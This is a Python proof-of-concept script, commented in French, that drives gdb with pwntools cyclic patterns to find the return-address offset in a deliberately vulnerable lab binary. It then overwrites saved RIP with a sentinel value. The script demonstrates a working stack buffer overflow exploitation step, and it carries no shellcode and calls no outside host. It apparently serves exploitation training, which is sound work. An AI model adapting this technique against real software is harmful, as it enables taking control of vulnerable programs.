#!/usr/bin/env python3
"""PoC : contrôle de RIP sur 01_stack_bof_vuln via cyclic pattern + gdb batch."""

from __future__ import annotations

import os
import re
import subprocess
import sys
import tempfile

from pwn import cyclic, cyclic_find, p64

SENTINELLE = 0xDEADBEEF


def _gdb_crash(binary: str, data: bytes) -> tuple[int | None, int | None]:
    with tempfile.NamedTemporaryFile(delete=False) as tf:
        tf.write(data)
        chemin = tf.name
    try:
        sortie = subprocess.run(
            ["gdb", "-q", "-batch", "-nx",
             "-ex", "set debuginfod enabled off",
             "-ex", "set pagination off",
             "-ex", f"run < {chemin}",
             "-ex", 'printf "RIP=%#lx\\n", $rip',
             "-ex", 'printf "RET=%#lx\\n", *(unsigned long*)$rsp',
             binary],
            capture_output=True, text=True, timeout=60,
        ).stdout
    finally:
        os.unlink(chemin)
    rip = re.search(r"RIP=(0x[0-9a-f]+)", sortie)
    ret = re.search(r"RET=(0x[0-9a-f]+)", sortie)
    return (int(rip.group(1), 16) if rip else None,
            int(ret.group(1), 16) if ret else None)


def main() -> int:
    defaut = os.path.join(os.path.dirname(__file__), "..", "corpus", "build", "01_stack_bof_vuln")
    binary = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else defaut)
    if not os.path.exists(binary):
        print(f"[!] binaire introuvable : {binary}")
        return 1
    print(f"[*] Cible : {binary}")

    motif = cyclic(300, n=8)
    _, ret = _gdb_crash(binary, motif)
    if ret is None:
        print("[!] impossible de lire l'adresse de retour écrasée")
        return 1
    offset = cyclic_find(p64(ret), n=8)
    print(f"[+] Adresse de retour écrasée : {ret:#018x}")
    print(f"[+] Offset buffer -> saved RIP : {offset} octets")

    payload = b"A" * offset + p64(SENTINELLE)
    rip, _ = _gdb_crash(binary, payload)
    print(f"[+] Payload : {offset} x 'A' + p64({SENTINELLE:#x})")
    print(f"[+] RIP au moment du crash : {rip:#x}" if rip is not None else "[!] RIP illisible")
    if rip == SENTINELLE:
        print(f"[OK] Contrôle de RIP démontré : RIP = {SENTINELLE:#x}.")
        return 0
    print("[!] Contrôle de RIP non confirmé.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
